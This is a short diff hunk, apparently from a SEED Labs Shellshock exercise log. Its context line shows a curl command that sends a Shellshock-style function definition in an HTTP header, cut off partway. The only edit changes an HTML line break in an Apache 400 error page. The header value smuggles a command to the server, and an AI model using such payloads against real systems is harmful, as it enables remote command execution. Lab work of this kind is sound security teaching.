@@ -379,7 +379,7 @@ root@adb5168e1e79:/# curl -H "() { echo vulnerable; }; echo Content_type: text/p
 <title>400 Bad Request</title>
 </head><body>
 <h1>Bad Request</h1>
-<p>Your browser sent a request that this server could not understand.<br />
+<p>Your browser sent a request that this server could not understand.<br>
 </p>
 <hr>
 <address>Apache/2.4.41 (Ubuntu) Server at www.seedlab-shellshock.com Port 80</address>
